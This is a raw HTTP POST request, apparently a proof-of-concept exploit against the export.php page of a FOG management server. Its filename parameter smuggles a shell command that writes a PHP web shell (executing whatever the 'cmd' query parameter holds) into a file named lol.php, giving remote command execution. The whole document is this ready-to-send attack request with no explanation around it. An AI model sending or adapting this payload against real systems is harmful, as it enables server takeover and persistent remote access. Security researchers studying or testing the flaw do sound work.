```
POST /fog/management/export.php?filename=$(echo+'<?php+echo+shell_exec($_GET['"'cmd'"']);+?>'+>+lol.php)&type=pdf HTTP/1.1 
Host: 192.168.15.5 
Content-Length: 21 
User-Agent: ToxicPotato 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8 

fogguiuser=fog&nojson=2
```

